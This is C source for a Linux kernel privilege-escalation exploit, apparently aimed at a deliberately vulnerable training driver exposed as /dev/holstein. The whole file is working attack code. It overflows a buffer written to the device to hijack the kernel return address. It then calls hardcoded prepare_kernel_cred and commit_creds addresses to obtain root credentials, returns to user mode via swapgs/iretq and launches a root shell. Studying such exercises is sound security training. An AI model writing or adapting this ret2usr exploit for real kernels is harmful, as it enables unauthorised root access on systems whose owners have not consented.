#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int global_fd;
#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds 0xffffffff8106e390

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void open_kn() {
  global_fd = open("/dev/holstein", O_RDWR);
  if (global_fd < 0) {
    exit(-1);
  }
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

unsigned long user_rip = (unsigned long)win;
void escalate_privs(void) {
  __asm__(".intel_syntax noprefix;"
          "movabs rax, 0xffffffff8106e240;" // prepare_kernel_cred
          "xor rdi, rdi;"
          "call rax; mov rdi, rax;"
          "movabs rax, 0xffffffff8106e390;" // commit_creds
          "call rax;"
          "swapgs;"
          "mov r15, user_ss;"
          "push r15;"
          "mov r15, user_sp;"
          "push r15;"
          "mov r15, user_rflags;"
          "push r15;"
          "mov r15, user_cs;"
          "push r15;"
          "mov r15, user_rip;"
          "push r15;"
          "iretq;"
          ".att_syntax;");
}
void write_kn() {
  uint64_t buf[150];
  buf[129] = (uint64_t)escalate_privs;

  write(global_fd, buf, sizeof(buf));
  puts("[+] write success");
}

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
  puts("[*] Saved state");
}
int main() {
  save_state();
  open_kn();
  write_kn();

  return 0;
}